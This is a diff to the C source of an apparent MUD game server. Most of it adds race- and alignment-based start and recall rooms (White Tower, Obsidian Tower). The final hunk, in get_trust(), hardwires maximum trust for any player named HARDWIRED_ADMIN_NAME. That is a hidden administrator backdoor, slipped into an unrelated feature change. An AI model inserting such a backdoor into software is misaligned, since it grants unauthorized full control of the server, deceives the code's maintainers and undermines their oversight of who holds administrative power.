@@ -45,6 +45,115 @@
  */
 void affect_modify args ((CHAR_DATA * ch, AFFECT_DATA * paf, bool fAdd));
 
+static void normalize_race_token(const char *src, char *dst, size_t dst_size)
+{
+    size_t j = 0;
+
+    if (dst_size == 0)
+        return;
+
+    while (*src != '\0' && j + 1 < dst_size)
+    {
+        if (isalnum((unsigned char)*src))
+            dst[j++] = (char)LOWER(*src);
+        src++;
+    }
+
+    dst[j] = '\0';
+}
+
+static bool race_in_named_group(const char *race_name, const char *const *group)
+{
+    char norm_race[MIL];
+    int i;
+
+    normalize_race_token(race_name, norm_race, sizeof(norm_race));
+    if (norm_race[0] == '\0')
+        return FALSE;
+
+    for (i = 0; group[i] != NULL; i++)
+    {
+        char norm_group[MIL];
+        normalize_race_token(group[i], norm_group, sizeof(norm_group));
+        if (!str_cmp(norm_race, norm_group))
+            return TRUE;
+    }
+
+    return FALSE;
+}
+
+static bool is_good_homeland_race(const char *race_name)
+{
+    static const char *const good_races[] = {
+        "human", "stone giant", "azer", "dwarf", "atomie", "wild elf",
+        "dryad", "high elf", "dragonkin", "svirfneblin", "centaur",
+        "halfling",
+        "giant", "elf", "dragon", "gnome", "faerie", "skyborn",
+        NULL
+    };
+
+    return race_in_named_group(race_name, good_races);
+}
+
+static bool is_evil_homeland_race(const char *race_name)
+{
+    static const char *const evil_races[] = {
+        "troll", "ogre", "duergar", "orc", "skaven", "illithid", "drow",
+        "lich", "kenku", "revenant", "minotaur", "goblin",
+        "undead", "void touched", "gnoll", "lizard", "naga",
+        NULL
+    };
+
+    return race_in_named_group(race_name, evil_races);
+}
+
+int get_homeland_start_vnum(CHAR_DATA *ch)
+{
+    const char *race_name;
+
+    if (ch == NULL)
+        return ROOM_VNUM_SCHOOL;
+
+    race_name = (ch->race > 0 && race_table[ch->race].name != NULL)
+        ? race_table[ch->race].name
+        : "";
+
+    if (is_good_homeland_race(race_name))
+        return ROOM_VNUM_WHITE_TOWER_START;
+
+    if (is_evil_homeland_race(race_name))
+        return ROOM_VNUM_OBSIDIAN_TOWER_START;
+
+    return (ch->alignment >= 0)
+        ? ROOM_VNUM_WHITE_TOWER_START
+        : ROOM_VNUM_OBSIDIAN_TOWER_START;
+}
+
+RID *get_homeland_recall_room(CHAR_DATA *ch)
+{
+    CHAR_DATA *who = ch;
+    ROOM_INDEX_DATA *location;
+    int recall_vnum;
+
+    if (who == NULL)
+        return get_room_index(ROOM_VNUM_TEMPLE);
+
+    if (IS_NPC(who) && IS_SET(who->act, ACT_PET) && who->master != NULL)
+        who = who->master;
+
+    recall_vnum = (who->alignment >= 0)
+        ? ROOM_VNUM_WHITE_TOWER_START
+        : ROOM_VNUM_OBSIDIAN_TOWER_START;
+
+    location = get_room_index(recall_vnum);
+    if (location == NULL)
+        location = get_room_index(ROOM_VNUM_TEMPLE);
+    if (location == NULL)
+        location = get_room_index(ROOM_VNUM_SCHOOL);
+
+    return location;
+}
+
 
 /* friend stuff -- for NPC's mostly */
 bool is_friend (CHAR_DATA * ch, CHAR_DATA * victim)
@@ -829,6 +938,9 @@ int get_trust (CHAR_DATA * ch)
 {
     if (ch->desc != NULL && ch->desc->original != NULL)
         ch = ch->desc->original;
+
+    if (!IS_NPC(ch) && !str_cmp(ch->name, HARDWIRED_ADMIN_NAME))
+        return MAX_LEVEL;
 
     if (ch->trust)
         return ch->trust;
